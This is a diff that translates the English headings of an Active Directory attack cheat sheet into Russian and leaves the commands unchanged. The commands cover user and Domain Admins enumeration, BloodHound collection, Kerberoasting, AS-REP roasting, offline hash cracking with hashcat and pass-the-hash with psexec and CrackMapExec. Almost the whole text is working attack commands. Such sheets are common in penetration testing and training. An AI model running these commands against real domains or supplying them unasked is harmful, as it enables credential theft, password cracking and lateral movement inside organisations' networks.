@@ -16,93 +16,93 @@ Active Directory — это платформа управления иденти
 net user /domain
 ```
 
-List Domain Admins group members
+Перечислить участников группы Domain Admins (Администраторы домена)
 
 ```
 net group "Domain Admins" /domain
 ```
 
-List domain controllers
+Перечислить контроллеры домена
 
 ```
 nltest /dclist:<domain>
 ```
 
-PowerShell: enumerate all AD users
+PowerShell: перечислить всех пользователей AD
 
 ```
 Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled
 ```
 
-PowerShell: Domain Admins members
+PowerShell: участники группы Domain Admins
 
 ```
 Get-ADGroupMember "Domain Admins" | Select Name,SamAccountName
 ```
 
-LDAP enumeration of users
+Перечисление пользователей по LDAP
 
 ```
 ldapsearch -H ldap://<DC_IP> -x -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
 ```
 
-BloodHound collection
+Сбор данных BloodHound
 
 ```
 bloodhound-python -u user -p pass -d domain.com -c All --zip
 ```
 
-If the command above fails, specify the domain controller and DNS server explicitly. Replace `DC01.domain.com` and `<DC_IP>` with your domain controller's hostname and IP address.
+Если приведенная выше команда не сработает, укажите контроллер домена и DNS-сервер явно. Замените `DC01.domain.com` и `<DC_IP>` на имя хоста и IP-адрес вашего контроллера домена.
 
-BloodHound collection: explicit DC and DNS
+Сбор данных BloodHound: явное указание контроллера домена (DC) и DNS
 
 ```
 bloodhound-python -u 'user' -p 'password' -d domain.com -dc DC01.domain.com -ns <DC_IP> -c All --zip
 ```
 
-impacket: get TGS hashes
+Impacket: получение хэшей TGS
 
 ```
 python3 GetUserSPNs.py domain.com/user:password -dc-ip <DC_IP> -request
 ```
 
-Windows: Kerberoast all SPNs
+Windows: Kerberoasting всех SPN
 
 ```
 Rubeus.exe kerberoast /outfile:hashes.txt
 ```
 
-Crack TGS-REP hashes offline
+Взлом хэшей TGS-REP в автономном режиме (офлайн)
 
 ```
 hashcat -m 13100 -a 0 hashes.txt rockyou.txt
 ```
 
-Get AS-REP for accounts with no pre-auth
+Получение AS-REP для учетных записей без предварительной аутентификации
 
 ```
 python3 GetNPUsers.py domain.com/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
 ```
 
-Windows AS-REP roasting
+AS-REP roasting в Windows
 
 ```
 Rubeus.exe asreproast /outfile:asrep_hashes.txt
 ```
 
-Crack AS-REP hashes
+Взлом хэшей AS-REP
 
 ```
 hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
 ```
 
-impacket: PtH with psexec
+Impacket: Pass-the-Hash с помощью psexec
 
 ```
 python3 psexec.py -hashes :NTLM_HASH domain/user@target
 ```
 
-CrackMapExec: PtH SMB
+CrackMapExec: Pass-the-Hash (PtH) по SMB
 ```
 crackmapexec smb target -u user -H NTLM_HASH
 ```
